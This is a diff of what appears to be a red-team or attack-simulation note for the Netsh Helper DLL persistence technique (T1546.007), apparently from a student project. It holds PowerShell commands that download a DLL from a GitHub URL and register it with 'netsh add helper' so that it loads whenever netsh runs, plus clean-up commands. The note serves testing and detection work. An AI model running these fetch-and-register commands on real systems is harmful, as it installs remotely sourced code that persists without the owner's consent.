@@ -1,18 +1,15 @@
+Event Triggered Execution: Netsh Helper DLL (T1546.007)
 
-Event Triggered Execution: Netsh Helper DLL
 
+POWERSHELL
 ---------------------------------------------------
-
 powershell -Command "Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/dllExampleInjection2.dll -OutFile '%USERPROFILE%\Downloads\dllExampleInjection2.dll'"
 netsh add helper %USERPROFILE%\Downloads\dllExampleInjection2.dll
-
 netsh.exe
 
----------------------------------------------------
 
 CLEAN UP 
 del %USERPROFILE%\Downloads\dllExampleInjection2.dll
 netsh delete helper %USERPROFILE%\Downloads\dllExampleInjection2.dll
-
-
+---------------------------------------------------
 
